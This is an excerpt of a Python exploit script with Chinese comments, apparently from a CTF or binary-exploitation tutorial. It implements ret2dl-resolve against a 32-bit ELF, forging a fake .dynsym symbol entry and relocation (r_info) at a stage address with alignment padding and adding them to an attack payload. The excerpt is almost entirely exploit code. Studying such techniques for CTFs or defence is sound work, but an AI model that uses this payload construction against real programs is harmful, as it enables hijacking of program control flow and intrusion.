...
dynsym = 0x080481d8
dynstr = 0x08048278
fake_sym_addr = base_stage + 36         # 在base_stage + 36处部署.dynsym结构体
# 对齐
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align

index_dynsym = (fake_sym_addr - dynsym) / 0x10      # 计算.dynsym结构体的下标
r_info = (index_dynsym << 8) | 0x7                  # 由.dynsym结构体下标反推r_info
fake_reloc = p32(write_got) + p32(r_info)
st_name = 0x4c
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)   # 伪造的.dynsym结构体
...
payload2 += 'B' * align     # 对齐
payload2 += fake_sym        # (base_stage+36)的位置 伪造的.dynsym结构体
